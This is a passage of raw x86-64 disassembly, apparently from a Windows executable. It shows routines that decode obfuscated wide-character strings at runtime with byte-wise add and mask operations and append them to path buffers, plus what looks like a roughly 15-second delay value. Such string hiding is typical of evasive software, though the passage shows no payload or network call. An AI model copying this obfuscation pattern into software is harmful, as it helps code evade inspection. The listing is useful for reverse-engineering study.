   1400043e6:	0f 84 26 63 00 00    	je     0x14000a712
   1400043ec:	80 3d 0b 9c 50 00 00 	cmpb   $0x0,0x509c0b(%rip)        # 0x14050dffe
   1400043f3:	0f 84 fb 00 00 00    	je     0x1400044f4
   1400043f9:	66 0f 6f 05 bf 02 01 	movdqa 0x102bf(%rip),%xmm0        # 0x1400146c0
   140004400:	00 
   140004401:	66 0f 6f 0d a7 9b 50 	movdqa 0x509ba7(%rip),%xmm1        # 0x14050dfb0
   140004408:	00 
   140004409:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000440d:	66 0f 6f 15 2b 02 01 	movdqa 0x1022b(%rip),%xmm2        # 0x140014640
   140004414:	00 
   140004415:	66 0f db ca          	pand   %xmm2,%xmm1
   140004419:	66 0f 7f 0d 8f 9b 50 	movdqa %xmm1,0x509b8f(%rip)        # 0x14050dfb0
   140004420:	00 
   140004421:	66 0f 6f 0d 97 9b 50 	movdqa 0x509b97(%rip),%xmm1        # 0x14050dfc0
   140004428:	00 
   140004429:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000442d:	66 0f db ca          	pand   %xmm2,%xmm1
   140004431:	66 0f 7f 0d 87 9b 50 	movdqa %xmm1,0x509b87(%rip)        # 0x14050dfc0
   140004438:	00 
   140004439:	66 0f 6f 0d 8f 9b 50 	movdqa 0x509b8f(%rip),%xmm1        # 0x14050dfd0
   140004440:	00 
   140004441:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004445:	66 0f db ca          	pand   %xmm2,%xmm1
   140004449:	66 0f 7f 0d 7f 9b 50 	movdqa %xmm1,0x509b7f(%rip)        # 0x14050dfd0
   140004450:	00 
   140004451:	66 0f fd 05 87 9b 50 	paddw  0x509b87(%rip),%xmm0        # 0x14050dfe0
   140004458:	00 
   140004459:	66 0f db c2          	pand   %xmm2,%xmm0
   14000445d:	66 0f 7f 05 7b 9b 50 	movdqa %xmm0,0x509b7b(%rip)        # 0x14050dfe0
   140004464:	00 
   140004465:	8b 05 85 9b 50 00    	mov    0x509b85(%rip),%eax        # 0x14050dff0
   14000446b:	83 c0 43             	add    $0x43,%eax
   14000446e:	0f b6 c0             	movzbl %al,%eax
   140004471:	66 89 05 78 9b 50 00 	mov    %ax,0x509b78(%rip)        # 0x14050dff0
   140004478:	0f b7 05 73 9b 50 00 	movzwl 0x509b73(%rip),%eax        # 0x14050dff2
   14000447f:	83 c0 43             	add    $0x43,%eax
   140004482:	0f b6 c0             	movzbl %al,%eax
   140004485:	66 89 05 66 9b 50 00 	mov    %ax,0x509b66(%rip)        # 0x14050dff2
   14000448c:	8b 05 62 9b 50 00    	mov    0x509b62(%rip),%eax        # 0x14050dff4
   140004492:	83 c0 43             	add    $0x43,%eax
   140004495:	0f b6 c0             	movzbl %al,%eax
   140004498:	66 89 05 55 9b 50 00 	mov    %ax,0x509b55(%rip)        # 0x14050dff4
   14000449f:	0f b7 05 50 9b 50 00 	movzwl 0x509b50(%rip),%eax        # 0x14050dff6
   1400044a6:	83 c0 43             	add    $0x43,%eax
   1400044a9:	0f b6 c0             	movzbl %al,%eax
   1400044ac:	66 89 05 43 9b 50 00 	mov    %ax,0x509b43(%rip)        # 0x14050dff6
   1400044b3:	8b 05 3f 9b 50 00    	mov    0x509b3f(%rip),%eax        # 0x14050dff8
   1400044b9:	83 c0 43             	add    $0x43,%eax
   1400044bc:	0f b6 c0             	movzbl %al,%eax
   1400044bf:	66 89 05 32 9b 50 00 	mov    %ax,0x509b32(%rip)        # 0x14050dff8
   1400044c6:	0f b7 05 2d 9b 50 00 	movzwl 0x509b2d(%rip),%eax        # 0x14050dffa
   1400044cd:	83 c0 43             	add    $0x43,%eax
   1400044d0:	0f b6 c0             	movzbl %al,%eax
   1400044d3:	66 89 05 20 9b 50 00 	mov    %ax,0x509b20(%rip)        # 0x14050dffa
   1400044da:	8b 05 1c 9b 50 00    	mov    0x509b1c(%rip),%eax        # 0x14050dffc
   1400044e0:	83 c0 43             	add    $0x43,%eax
   1400044e3:	0f b6 c0             	movzbl %al,%eax
   1400044e6:	66 89 05 0f 9b 50 00 	mov    %ax,0x509b0f(%rip)        # 0x14050dffc
   1400044ed:	c6 05 0a 9b 50 00 00 	movb   $0x0,0x509b0a(%rip)        # 0x14050dffe
   1400044f4:	4c 8d 75 c0          	lea    -0x40(%rbp),%r14
   1400044f8:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   1400044ff:	4c 89 f1             	mov    %r14,%rcx
   140004502:	e8 89 ea 00 00       	call   0x140012f90
   140004507:	48 8d 15 a2 9a 50 00 	lea    0x509aa2(%rip),%rdx        # 0x14050dfb0
   14000450e:	4c 89 f1             	mov    %r14,%rcx
   140004511:	e8 6a ea 00 00       	call   0x140012f80
   140004516:	45 84 ed             	test   %r13b,%r13b
   140004519:	0f 84 e2 00 00 00    	je     0x140004601
   14000451f:	48 8d 8d 10 0a 00 00 	lea    0xa10(%rbp),%rcx
   140004526:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000452c:	31 d2                	xor    %edx,%edx
   14000452e:	e8 5d eb 00 00       	call   0x140013090
   140004533:	80 3d fd 97 50 00 00 	cmpb   $0x0,0x5097fd(%rip)        # 0x14050dd37
   14000453a:	0f 84 a6 70 00 00    	je     0x14000b5e6
   140004540:	80 3d 23 9b 50 00 00 	cmpb   $0x0,0x509b23(%rip)        # 0x14050e06a
   140004547:	74 5c                	je     0x1400045a5
   140004549:	66 0f 6f 05 ff 9a 50 	movdqa 0x509aff(%rip),%xmm0        # 0x14050e050
   140004550:	00 
   140004551:	66 0f fd 05 97 01 01 	paddw  0x10197(%rip),%xmm0        # 0x1400146f0
   140004558:	00 
   140004559:	66 0f db 05 df 00 01 	pand   0x100df(%rip),%xmm0        # 0x140014640
   140004560:	00 
   140004561:	66 0f 7f 05 e7 9a 50 	movdqa %xmm0,0x509ae7(%rip)        # 0x14050e050
   140004568:	00 
   140004569:	f3 0f 7e 05 ef 9a 50 	movq   0x509aef(%rip),%xmm0        # 0x14050e060
   140004570:	00 
   140004571:	66 0f fd 05 87 01 01 	paddw  0x10187(%rip),%xmm0        # 0x140014700
   140004578:	00 
   140004579:	66 0f db 05 ff 00 01 	pand   0x100ff(%rip),%xmm0        # 0x140014680
   140004580:	00 
   140004581:	66 0f d6 05 d7 9a 50 	movq   %xmm0,0x509ad7(%rip)        # 0x14050e060
   140004588:	00 
   140004589:	b8 c9 00 00 00       	mov    $0xc9,%eax
   14000458e:	03 05 d4 9a 50 00    	add    0x509ad4(%rip),%eax        # 0x14050e068
   140004594:	0f b6 c0             	movzbl %al,%eax
   140004597:	66 89 05 ca 9a 50 00 	mov    %ax,0x509aca(%rip)        # 0x14050e068
   14000459e:	c6 05 c5 9a 50 00 00 	movb   $0x0,0x509ac5(%rip)        # 0x14050e06a
   1400045a5:	48 8d 0d a4 9a 50 00 	lea    0x509aa4(%rip),%rcx        # 0x14050e050
   1400045ac:	e8 ef e9 00 00       	call   0x140012fa0
   1400045b1:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   1400045b5:	0f 84 78 01 00 00    	je     0x140004733
   1400045bb:	48 89 c3             	mov    %rax,%rbx
   1400045be:	4c 8d 3d 8b 9a 50 00 	lea    0x509a8b(%rip),%r15        # 0x14050e050
   1400045c5:	31 ff                	xor    %edi,%edi
   1400045c7:	49 89 f4             	mov    %rsi,%r12
   1400045ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400045d0:	4c 89 e1             	mov    %r12,%rcx
   1400045d3:	4c 89 fa             	mov    %r15,%rdx
   1400045d6:	49 89 d8             	mov    %rbx,%r8
   1400045d9:	e8 62 ea 00 00       	call   0x140013040
   1400045de:	85 c0                	test   %eax,%eax
   1400045e0:	0f 84 51 01 00 00    	je     0x140004737
   1400045e6:	4c 89 e1             	mov    %r12,%rcx
   1400045e9:	e8 b2 e9 00 00       	call   0x140012fa0
   1400045ee:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   1400045f5:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   1400045fa:	75 d4                	jne    0x1400045d0
   1400045fc:	e9 3a 01 00 00       	jmp    0x14000473b
   140004601:	80 3d 2e 97 50 00 00 	cmpb   $0x0,0x50972e(%rip)        # 0x14050dd36
   140004608:	0f 84 2e 70 00 00    	je     0x14000b63c
   14000460e:	80 3d 2f 9a 50 00 00 	cmpb   $0x0,0x509a2f(%rip)        # 0x14050e044
   140004615:	0f 84 9a 00 00 00    	je     0x1400046b5
   14000461b:	66 0f 6f 05 ad 00 01 	movdqa 0x100ad(%rip),%xmm0        # 0x1400146d0
   140004622:	00 
   140004623:	66 0f 6f 0d d5 99 50 	movdqa 0x5099d5(%rip),%xmm1        # 0x14050e000
   14000462a:	00 
   14000462b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000462f:	66 0f 6f 15 09 00 01 	movdqa 0x10009(%rip),%xmm2        # 0x140014640
   140004636:	00 
   140004637:	66 0f db ca          	pand   %xmm2,%xmm1
   14000463b:	66 0f 7f 0d bd 99 50 	movdqa %xmm1,0x5099bd(%rip)        # 0x14050e000
   140004642:	00 
   140004643:	66 0f 6f 0d c5 99 50 	movdqa 0x5099c5(%rip),%xmm1        # 0x14050e010
   14000464a:	00 
   14000464b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000464f:	66 0f db ca          	pand   %xmm2,%xmm1
   140004653:	66 0f 7f 0d b5 99 50 	movdqa %xmm1,0x5099b5(%rip)        # 0x14050e010
   14000465a:	00 
   14000465b:	66 0f 6f 0d bd 99 50 	movdqa 0x5099bd(%rip),%xmm1        # 0x14050e020
   140004662:	00 
   140004663:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004667:	66 0f db ca          	pand   %xmm2,%xmm1
   14000466b:	66 0f 7f 0d ad 99 50 	movdqa %xmm1,0x5099ad(%rip)        # 0x14050e020
   140004672:	00 
   140004673:	66 0f fd 05 b5 99 50 	paddw  0x5099b5(%rip),%xmm0        # 0x14050e030
   14000467a:	00 
   14000467b:	66 0f db c2          	pand   %xmm2,%xmm0
   14000467f:	66 0f 7f 05 a9 99 50 	movdqa %xmm0,0x5099a9(%rip)        # 0x14050e030
   140004686:	00 
   140004687:	8b 05 b3 99 50 00    	mov    0x5099b3(%rip),%eax        # 0x14050e040
   14000468d:	83 c0 29             	add    $0x29,%eax
   140004690:	0f b6 c0             	movzbl %al,%eax
   140004693:	66 89 05 a6 99 50 00 	mov    %ax,0x5099a6(%rip)        # 0x14050e040
   14000469a:	0f b7 05 a1 99 50 00 	movzwl 0x5099a1(%rip),%eax        # 0x14050e042
   1400046a1:	83 c0 29             	add    $0x29,%eax
   1400046a4:	0f b6 c0             	movzbl %al,%eax
   1400046a7:	66 89 05 94 99 50 00 	mov    %ax,0x509994(%rip)        # 0x14050e042
   1400046ae:	c6 05 8f 99 50 00 00 	movb   $0x0,0x50998f(%rip)        # 0x14050e044
   1400046b5:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400046ba:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400046bf:	4c 8d 0d 3a 99 50 00 	lea    0x50993a(%rip),%r9        # 0x14050e000
   1400046c6:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   1400046cd:	31 c9                	xor    %ecx,%ecx
   1400046cf:	4d 89 f0             	mov    %r14,%r8
   1400046d2:	e8 09 e8 ff ff       	call   0x140002ee0
   1400046d7:	e9 a6 6e 00 00       	jmp    0x14000b582
   1400046dc:	4b 8d 1c 74          	lea    (%r12,%r14,2),%rbx
   1400046e0:	80 3d 4d 96 50 00 00 	cmpb   $0x0,0x50964d(%rip)        # 0x14050dd34
   1400046e7:	0f 85 70 fc ff ff    	jne    0x14000435d
   1400046ed:	c6 05 b0 98 50 00 01 	movb   $0x1,0x5098b0(%rip)        # 0x14050dfa4
   1400046f4:	66 0f 6f 05 94 ff 00 	movdqa 0xff94(%rip),%xmm0        # 0x140014690
   1400046fb:	00 
   1400046fc:	66 0f 7f 05 8c 98 50 	movdqa %xmm0,0x50988c(%rip)        # 0x14050df90
   140004703:	00 
   140004704:	c7 05 92 98 50 00 71 	movl   $0x3f0071,0x509892(%rip)        # 0x14050dfa0
   14000470b:	00 3f 00 
   14000470e:	48 8d 0d 4b a3 00 00 	lea    0xa34b(%rip),%rcx        # 0x14000ea60
   140004715:	e8 56 cc ff ff       	call   0x140001370
   14000471a:	c6 05 13 96 50 00 01 	movb   $0x1,0x509613(%rip)        # 0x14050dd34
   140004721:	80 3d 7c 98 50 00 00 	cmpb   $0x0,0x50987c(%rip)        # 0x14050dfa4
   140004728:	0f 85 38 fc ff ff    	jne    0x140004366
   14000472e:	e9 7a fc ff ff       	jmp    0x1400043ad
   140004733:	31 ff                	xor    %edi,%edi
   140004735:	eb 04                	jmp    0x14000473b
   140004737:	49 8d 3c 5c          	lea    (%r12,%rbx,2),%rdi
   14000473b:	80 3d f6 95 50 00 00 	cmpb   $0x0,0x5095f6(%rip)        # 0x14050dd38
   140004742:	0f 84 25 6f 00 00    	je     0x14000b66d
   140004748:	80 3d 57 99 50 00 00 	cmpb   $0x0,0x509957(%rip)        # 0x14050e0a6
   14000474f:	0f 84 99 00 00 00    	je     0x1400047ee
   140004755:	66 0f 6f 05 93 ff 00 	movdqa 0xff93(%rip),%xmm0        # 0x1400146f0
   14000475c:	00 
   14000475d:	66 0f 6f 0d 0b 99 50 	movdqa 0x50990b(%rip),%xmm1        # 0x14050e070
   140004764:	00 
   140004765:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004769:	66 0f 6f 15 cf fe 00 	movdqa 0xfecf(%rip),%xmm2        # 0x140014640
   140004770:	00 
   140004771:	66 0f db ca          	pand   %xmm2,%xmm1
   140004775:	66 0f 7f 0d f3 98 50 	movdqa %xmm1,0x5098f3(%rip)        # 0x14050e070
   14000477c:	00 
   14000477d:	66 0f 6f 0d fb 98 50 	movdqa 0x5098fb(%rip),%xmm1        # 0x14050e080
   140004784:	00 
   140004785:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004789:	66 0f db ca          	pand   %xmm2,%xmm1
   14000478d:	66 0f 7f 0d eb 98 50 	movdqa %xmm1,0x5098eb(%rip)        # 0x14050e080
   140004794:	00 
   140004795:	66 0f fd 05 f3 98 50 	paddw  0x5098f3(%rip),%xmm0        # 0x14050e090
   14000479c:	00 
   14000479d:	66 0f db c2          	pand   %xmm2,%xmm0
   1400047a1:	66 0f 7f 05 e7 98 50 	movdqa %xmm0,0x5098e7(%rip)        # 0x14050e090
   1400047a8:	00 
   1400047a9:	b8 c9 00 00 00       	mov    $0xc9,%eax
   1400047ae:	8b 0d ec 98 50 00    	mov    0x5098ec(%rip),%ecx        # 0x14050e0a0
   1400047b4:	01 c1                	add    %eax,%ecx
   1400047b6:	0f b6 c9             	movzbl %cl,%ecx
   1400047b9:	66 89 0d e0 98 50 00 	mov    %cx,0x5098e0(%rip)        # 0x14050e0a0
   1400047c0:	0f b7 0d db 98 50 00 	movzwl 0x5098db(%rip),%ecx        # 0x14050e0a2
   1400047c7:	81 c1 c9 00 00 00    	add    $0xc9,%ecx
   1400047cd:	0f b6 c9             	movzbl %cl,%ecx
   1400047d0:	66 89 0d cb 98 50 00 	mov    %cx,0x5098cb(%rip)        # 0x14050e0a2
   1400047d7:	03 05 c7 98 50 00    	add    0x5098c7(%rip),%eax        # 0x14050e0a4
   1400047dd:	0f b6 c0             	movzbl %al,%eax
   1400047e0:	66 89 05 bd 98 50 00 	mov    %ax,0x5098bd(%rip)        # 0x14050e0a4
   1400047e7:	c6 05 b8 98 50 00 00 	movb   $0x0,0x5098b8(%rip)        # 0x14050e0a6
   1400047ee:	48 8d 9d 10 0a 00 00 	lea    0xa10(%rbp),%rbx
   1400047f5:	48 89 d9             	mov    %rbx,%rcx
   1400047f8:	48 89 fa             	mov    %rdi,%rdx
   1400047fb:	e8 90 e7 00 00       	call   0x140012f90
   140004800:	48 8d 15 69 98 50 00 	lea    0x509869(%rip),%rdx        # 0x14050e070
   140004807:	48 89 d9             	mov    %rbx,%rcx
   14000480a:	e8 71 e7 00 00       	call   0x140012f80
   14000480f:	48 8d 8d 20 0c 00 00 	lea    0xc20(%rbp),%rcx
   140004816:	48 89 da             	mov    %rbx,%rdx
   140004819:	e8 12 e8 00 00       	call   0x140013030
   14000481e:	85 c0                	test   %eax,%eax
   140004820:	74 19                	je     0x14000483b
   140004822:	48 c7 85 70 16 00 00 	movq   $0xfffffffff70f2e80,0x1670(%rbp)
   140004829:	80 2e 0f f7 
   14000482d:	48 8d 95 70 16 00 00 	lea    0x1670(%rbp),%rdx
   140004834:	31 c9                	xor    %ecx,%ecx
   140004836:	e8 9b cc ff ff       	call   0x1400014d6
   14000483b:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   140004842:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004848:	31 d2                	xor    %edx,%edx
   14000484a:	e8 41 e8 00 00       	call   0x140013090
   14000484f:	80 3d e3 94 50 00 00 	cmpb   $0x0,0x5094e3(%rip)        # 0x14050dd39
   140004856:	0f 84 42 6e 00 00    	je     0x14000b69e
   14000485c:	80 3d 5f 98 50 00 00 	cmpb   $0x0,0x50985f(%rip)        # 0x14050e0c2
   140004863:	74 3c                	je     0x1400048a1
   140004865:	66 0f 6f 05 43 98 50 	movdqa 0x509843(%rip),%xmm0        # 0x14050e0b0
   14000486c:	00 
   14000486d:	66 0f fd 05 ab fe 00 	paddw  0xfeab(%rip),%xmm0        # 0x140014720
   140004874:	00 
   140004875:	66 0f db 05 c3 fd 00 	pand   0xfdc3(%rip),%xmm0        # 0x140014640
   14000487c:	00 
   14000487d:	66 0f 7f 05 2b 98 50 	movdqa %xmm0,0x50982b(%rip)        # 0x14050e0b0
   140004884:	00 
   140004885:	b8 85 00 00 00       	mov    $0x85,%eax
   14000488a:	03 05 30 98 50 00    	add    0x509830(%rip),%eax        # 0x14050e0c0
   140004890:	0f b6 c0             	movzbl %al,%eax
   140004893:	66 89 05 26 98 50 00 	mov    %ax,0x509826(%rip)        # 0x14050e0c0
   14000489a:	c6 05 21 98 50 00 00 	movb   $0x0,0x509821(%rip)        # 0x14050e0c2
   1400048a1:	4c 8d bd d0 01 00 00 	lea    0x1d0(%rbp),%r15
   1400048a8:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   1400048af:	4c 89 f9             	mov    %r15,%rcx
   1400048b2:	e8 d9 e6 00 00       	call   0x140012f90
   1400048b7:	48 8d 15 f2 97 50 00 	lea    0x5097f2(%rip),%rdx        # 0x14050e0b0
   1400048be:	4c 89 f9             	mov    %r15,%rcx
   1400048c1:	e8 ba e6 00 00       	call   0x140012f80
   1400048c6:	48 8d 8d f0 05 00 00 	lea    0x5f0(%rbp),%rcx
   1400048cd:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400048d3:	31 d2                	xor    %edx,%edx
   1400048d5:	e8 b6 e7 00 00       	call   0x140013090
   1400048da:	80 3d 59 94 50 00 00 	cmpb   $0x0,0x509459(%rip)        # 0x14050dd3a
   1400048e1:	0f 84 fc 6d 00 00    	je     0x14000b6e3
   1400048e7:	80 3d fc 97 50 00 00 	cmpb   $0x0,0x5097fc(%rip)        # 0x14050e0ea
   1400048ee:	74 5c                	je     0x14000494c
   1400048f0:	66 0f 6f 05 d8 97 50 	movdqa 0x5097d8(%rip),%xmm0        # 0x14050e0d0
   1400048f7:	00 
   1400048f8:	66 0f fd 05 40 fe 00 	paddw  0xfe40(%rip),%xmm0        # 0x140014740
   1400048ff:	00 
   140004900:	66 0f db 05 38 fd 00 	pand   0xfd38(%rip),%xmm0        # 0x140014640
   140004907:	00 
   140004908:	66 0f 7f 05 c0 97 50 	movdqa %xmm0,0x5097c0(%rip)        # 0x14050e0d0
   14000490f:	00 
   140004910:	f3 0f 7e 05 c8 97 50 	movq   0x5097c8(%rip),%xmm0        # 0x14050e0e0
   140004917:	00 
   140004918:	66 0f fd 05 30 fe 00 	paddw  0xfe30(%rip),%xmm0        # 0x140014750
   14000491f:	00 
   140004920:	66 0f db 05 58 fd 00 	pand   0xfd58(%rip),%xmm0        # 0x140014680
   140004927:	00 
   140004928:	66 0f d6 05 b0 97 50 	movq   %xmm0,0x5097b0(%rip)        # 0x14050e0e0
   14000492f:	00 
   140004930:	b8 e3 00 00 00       	mov    $0xe3,%eax
   140004935:	03 05 ad 97 50 00    	add    0x5097ad(%rip),%eax        # 0x14050e0e8
   14000493b:	0f b6 c0             	movzbl %al,%eax
   14000493e:	66 89 05 a3 97 50 00 	mov    %ax,0x5097a3(%rip)        # 0x14050e0e8
   140004945:	c6 05 9e 97 50 00 00 	movb   $0x0,0x50979e(%rip)        # 0x14050e0ea
   14000494c:	48 8d bd f0 05 00 00 	lea    0x5f0(%rbp),%rdi
   140004953:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   14000495a:	48 89 f9             	mov    %rdi,%rcx
   14000495d:	e8 2e e6 00 00       	call   0x140012f90
   140004962:	48 8d 15 67 97 50 00 	lea    0x509767(%rip),%rdx        # 0x14050e0d0
   140004969:	48 89 f9             	mov    %rdi,%rcx
   14000496c:	e8 0f e6 00 00       	call   0x140012f80
   140004971:	48 8d 8d e0 03 00 00 	lea    0x3e0(%rbp),%rcx
   140004978:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000497e:	31 d2                	xor    %edx,%edx
   140004980:	e8 0b e7 00 00       	call   0x140013090
   140004985:	80 3d af 93 50 00 00 	cmpb   $0x0,0x5093af(%rip)        # 0x14050dd3b
   14000498c:	0f 84 a7 6d 00 00    	je     0x14000b739
   140004992:	80 3d 67 97 50 00 00 	cmpb   $0x0,0x509767(%rip)        # 0x14050e100
   140004999:	74 27                	je     0x1400049c2
   14000499b:	66 0f 6f 05 4d 97 50 	movdqa 0x50974d(%rip),%xmm0        # 0x14050e0f0
   1400049a2:	00 
   1400049a3:	66 0f fd 05 c5 fd 00 	paddw  0xfdc5(%rip),%xmm0        # 0x140014770
   1400049aa:	00 
   1400049ab:	66 0f db 05 8d fc 00 	pand   0xfc8d(%rip),%xmm0        # 0x140014640
   1400049b2:	00 
   1400049b3:	66 0f 7f 05 35 97 50 	movdqa %xmm0,0x509735(%rip)        # 0x14050e0f0
   1400049ba:	00 
   1400049bb:	c6 05 3e 97 50 00 00 	movb   $0x0,0x50973e(%rip)        # 0x14050e100
   1400049c2:	48 8d bd e0 03 00 00 	lea    0x3e0(%rbp),%rdi
   1400049c9:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   1400049d0:	48 89 f9             	mov    %rdi,%rcx
   1400049d3:	e8 b8 e5 00 00       	call   0x140012f90
   1400049d8:	48 8d 15 11 97 50 00 	lea    0x509711(%rip),%rdx        # 0x14050e0f0
   1400049df:	48 89 f9             	mov    %rdi,%rcx
   1400049e2:	e8 99 e5 00 00       	call   0x140012f80
   1400049e7:	80 3d 4e 93 50 00 00 	cmpb   $0x0,0x50934e(%rip)        # 0x14050dd3c
   1400049ee:	0f 84 81 6d 00 00    	je     0x14000b775
   1400049f4:	80 3d eb 97 50 00 00 	cmpb   $0x0,0x5097eb(%rip)        # 0x14050e1e6
   1400049fb:	0f 84 85 01 00 00    	je     0x140004b86
   140004a01:	66 0f 6f 05 77 fd 00 	movdqa 0xfd77(%rip),%xmm0        # 0x140014780
   140004a08:	00 
   140004a09:	66 0f 6f 15 ff 96 50 	movdqa 0x5096ff(%rip),%xmm2        # 0x14050e110
   140004a10:	00 
   140004a11:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004a15:	66 0f 6f 0d 23 fc 00 	movdqa 0xfc23(%rip),%xmm1        # 0x140014640
   140004a1c:	00 
   140004a1d:	66 0f db d1          	pand   %xmm1,%xmm2
   140004a21:	66 0f 7f 15 e7 96 50 	movdqa %xmm2,0x5096e7(%rip)        # 0x14050e110
   140004a28:	00 
   140004a29:	66 0f 6f 15 ef 96 50 	movdqa 0x5096ef(%rip),%xmm2        # 0x14050e120
   140004a30:	00 
   140004a31:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004a35:	66 0f db d1          	pand   %xmm1,%xmm2
   140004a39:	66 0f 7f 15 df 96 50 	movdqa %xmm2,0x5096df(%rip)        # 0x14050e120
   140004a40:	00 
   140004a41:	66 0f 6f 15 e7 96 50 	movdqa 0x5096e7(%rip),%xmm2        # 0x14050e130
   140004a48:	00 
   140004a49:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004a4d:	66 0f db d1          	pand   %xmm1,%xmm2
   140004a51:	66 0f 7f 15 d7 96 50 	movdqa %xmm2,0x5096d7(%rip)        # 0x14050e130
   140004a58:	00 
   140004a59:	66 0f 6f 15 df 96 50 	movdqa 0x5096df(%rip),%xmm2        # 0x14050e140
   140004a60:	00 
   140004a61:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004a65:	66 0f db d1          	pand   %xmm1,%xmm2
   140004a69:	66 0f 7f 15 cf 96 50 	movdqa %xmm2,0x5096cf(%rip)        # 0x14050e140
   140004a70:	00 
   140004a71:	66 0f 6f 15 d7 96 50 	movdqa 0x5096d7(%rip),%xmm2        # 0x14050e150
   140004a78:	00 
   140004a79:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004a7d:	66 0f db d1          	pand   %xmm1,%xmm2
   140004a81:	66 0f 7f 15 c7 96 50 	movdqa %xmm2,0x5096c7(%rip)        # 0x14050e150
   140004a88:	00 
   140004a89:	66 0f 6f 15 cf 96 50 	movdqa 0x5096cf(%rip),%xmm2        # 0x14050e160
   140004a90:	00 
   140004a91:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004a95:	66 0f db d1          	pand   %xmm1,%xmm2
   140004a99:	66 0f 7f 15 bf 96 50 	movdqa %xmm2,0x5096bf(%rip)        # 0x14050e160
   140004aa0:	00 
   140004aa1:	66 0f 6f 15 c7 96 50 	movdqa 0x5096c7(%rip),%xmm2        # 0x14050e170
   140004aa8:	00 
   140004aa9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004aad:	66 0f db d1          	pand   %xmm1,%xmm2
   140004ab1:	66 0f 7f 15 b7 96 50 	movdqa %xmm2,0x5096b7(%rip)        # 0x14050e170
   140004ab8:	00 
   140004ab9:	66 0f 6f 15 bf 96 50 	movdqa 0x5096bf(%rip),%xmm2        # 0x14050e180
   140004ac0:	00 
   140004ac1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004ac5:	66 0f db d1          	pand   %xmm1,%xmm2
   140004ac9:	66 0f 7f 15 af 96 50 	movdqa %xmm2,0x5096af(%rip)        # 0x14050e180
   140004ad0:	00 
   140004ad1:	66 0f 6f 15 b7 96 50 	movdqa 0x5096b7(%rip),%xmm2        # 0x14050e190
   140004ad8:	00 
   140004ad9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004add:	66 0f db d1          	pand   %xmm1,%xmm2
   140004ae1:	66 0f 7f 15 a7 96 50 	movdqa %xmm2,0x5096a7(%rip)        # 0x14050e190
   140004ae8:	00 
   140004ae9:	66 0f 6f 15 af 96 50 	movdqa 0x5096af(%rip),%xmm2        # 0x14050e1a0
   140004af0:	00 
   140004af1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004af5:	66 0f db d1          	pand   %xmm1,%xmm2
   140004af9:	66 0f 7f 15 9f 96 50 	movdqa %xmm2,0x50969f(%rip)        # 0x14050e1a0
   140004b00:	00 
   140004b01:	66 0f 6f 15 a7 96 50 	movdqa 0x5096a7(%rip),%xmm2        # 0x14050e1b0
   140004b08:	00 
   140004b09:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004b0d:	66 0f db d1          	pand   %xmm1,%xmm2
   140004b11:	66 0f 7f 15 97 96 50 	movdqa %xmm2,0x509697(%rip)        # 0x14050e1b0
   140004b18:	00 
   140004b19:	66 0f 6f 15 9f 96 50 	movdqa 0x50969f(%rip),%xmm2        # 0x14050e1c0
   140004b20:	00 
   140004b21:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004b25:	66 0f db d1          	pand   %xmm1,%xmm2
   140004b29:	66 0f 7f 15 8f 96 50 	movdqa %xmm2,0x50968f(%rip)        # 0x14050e1c0
   140004b30:	00 
   140004b31:	66 0f fd 05 97 96 50 	paddw  0x509697(%rip),%xmm0        # 0x14050e1d0
   140004b38:	00 
   140004b39:	66 0f db c1          	pand   %xmm1,%xmm0
   140004b3d:	66 0f 7f 05 8b 96 50 	movdqa %xmm0,0x50968b(%rip)        # 0x14050e1d0
   140004b44:	00 
   140004b45:	8b 05 95 96 50 00    	mov    0x509695(%rip),%eax        # 0x14050e1e0
   140004b4b:	83 c0 5b             	add    $0x5b,%eax
   140004b4e:	0f b6 c0             	movzbl %al,%eax
   140004b51:	66 89 05 88 96 50 00 	mov    %ax,0x509688(%rip)        # 0x14050e1e0
   140004b58:	0f b7 05 83 96 50 00 	movzwl 0x509683(%rip),%eax        # 0x14050e1e2
   140004b5f:	83 c0 5b             	add    $0x5b,%eax
   140004b62:	0f b6 c0             	movzbl %al,%eax
   140004b65:	66 89 05 76 96 50 00 	mov    %ax,0x509676(%rip)        # 0x14050e1e2
   140004b6c:	8b 05 72 96 50 00    	mov    0x509672(%rip),%eax        # 0x14050e1e4
   140004b72:	83 c0 5b             	add    $0x5b,%eax
   140004b75:	0f b6 c0             	movzbl %al,%eax
   140004b78:	66 89 05 65 96 50 00 	mov    %ax,0x509665(%rip)        # 0x14050e1e4
   140004b7f:	c6 05 60 96 50 00 00 	movb   $0x0,0x509660(%rip)        # 0x14050e1e6
